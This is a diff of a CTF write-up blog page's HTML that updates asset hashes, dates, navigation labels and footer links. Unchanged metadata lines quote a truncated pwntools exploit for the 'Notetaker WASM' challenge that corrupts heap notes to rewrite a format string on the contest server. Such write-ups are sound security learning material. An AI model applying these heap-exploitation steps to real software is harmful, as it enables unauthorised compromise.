@@ -11,8 +11,8 @@
 Notetaker WASM from pwn import * def run(i): p = remote(&#34;bin.bcactf.com&#34;, 49180) #p = process([&#34;node&#34;, &#34;--experimental-wasi-unstable-preview1&#34;, &#34;runner.js&#34;]) def note_print(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;1&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_delete(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;2&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_create(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;3&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_write(idx, data): p.sendlineafter(b&#34;4)\n&#34;, b&#34;4&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) p.sendlineafter(b&#34;\n&#34;, data) note_create(1) note_create(2) note_create(3) note_delete(1) # 0x442: %15d -&gt; %lld note_write(1, p32(0x443-0xc) &#43; p32(0x646c6c)) note_delete(2) note_delete(1) calc = lambda fd, bk: ((fd-0x8) &lt;&lt; 32) | bk note_write(1, str(calc(0xc00 &#43; 0x4*6, 0x400&#43;0xc*i)).">
 <meta name="author" content="imssm99">
 <link rel="canonical" href="https://blog.imssm99.kr/ctf/bcactf_3_0/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
-<script defer crossorigin="anonymous" src="/assets/js/highlight.min.e85ad0406048e8176e1c7661b25d5c69297ddfe41dc4124cf75ecb99a4f7b3d1.js" integrity="sha256-6FrQQGBI6BduHHZhsl1caSl93&#43;QdxBJM917LmaT3s9E="
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css" integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
     onload="hljs.initHighlightingOnLoad();"></script>
 <link rel="icon" href="https://blog.imssm99.kr/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://blog.imssm99.kr/favicon-16x16.png">
@@ -45,8 +45,8 @@ if (!doNotTrack) {
 Notetaker WASM from pwn import * def run(i): p = remote(&#34;bin.bcactf.com&#34;, 49180) #p = process([&#34;node&#34;, &#34;--experimental-wasi-unstable-preview1&#34;, &#34;runner.js&#34;]) def note_print(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;1&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_delete(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;2&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_create(idx): p.sendlineafter(b&#34;4)\n&#34;, b&#34;3&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) def note_write(idx, data): p.sendlineafter(b&#34;4)\n&#34;, b&#34;4&#34;) p.sendlineafter(b&#34;inclusive)\n&#34;, str(idx).encode()) p.sendlineafter(b&#34;\n&#34;, data) note_create(1) note_create(2) note_create(3) note_delete(1) # 0x442: %15d -&gt; %lld note_write(1, p32(0x443-0xc) &#43; p32(0x646c6c)) note_delete(2) note_delete(1) calc = lambda fd, bk: ((fd-0x8) &lt;&lt; 32) | bk note_write(1, str(calc(0xc00 &#43; 0x4*6, 0x400&#43;0xc*i))." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://blog.imssm99.kr/ctf/bcactf_3_0/" /><meta property="article:section" content="ctf" />
-<meta property="article:published_time" content="2022-06-10T20:24:11&#43;09:00" />
-<meta property="article:modified_time" content="2022-06-10T20:24:11&#43;09:00" />
+<meta property="article:published_time" content="2022-06-10T20:24:11+09:00" />
+<meta property="article:modified_time" content="2022-06-10T20:24:11+09:00" />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="BCACTF 3.0 Writeup"/>
@@ -115,8 +115,8 @@ Notetaker WASM from pwn import * def run(i): p = remote(&#34;bin.bcactf.com&#34;
     <nav class="nav">
         <div class="logo">
             <a href="https://blog.imssm99.kr/" accesskey="h" title="imssm99 Blog (Alt + H)">imssm99 Blog</a>
-            <span class="logo-switches">
-            </span>
+            <div class="logo-switches">
+            </div>
         </div>
         <ul id="menu">
             <li>
@@ -308,12 +308,12 @@ Notetaker WASM from pwn import * def run(i): p = remote(&#34;bin.bcactf.com&#34;
     </ul>
 <nav class="paginav">
   <a class="prev" href="https://blog.imssm99.kr/ctf/google_ctf_2022/">
-    <span class="title">« Prev Page</span>
+    <span class="title">« Prev</span>
     <br>
     <span>Google Capture The Flag 2022 Writeup</span>
   </a>
   <a class="next" href="https://blog.imssm99.kr/ctf/codegate2022_qual/">
-    <span class="title">Next Page »</span>
+    <span class="title">Next »</span>
     <br>
     <span>Codegate2022 Qual Writeup</span>
   </a>
@@ -324,11 +324,11 @@ Notetaker WASM from pwn import * def run(i): p = remote(&#34;bin.bcactf.com&#34;
     </main>
     
 <footer class="footer">
-    <span>&copy; 2022 <a href="https://blog.imssm99.kr/">imssm99 Blog</a></span>
+    <span>&copy; 2023 <a href="https://blog.imssm99.kr/">imssm99 Blog</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
     </span>
 </footer>
 <a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
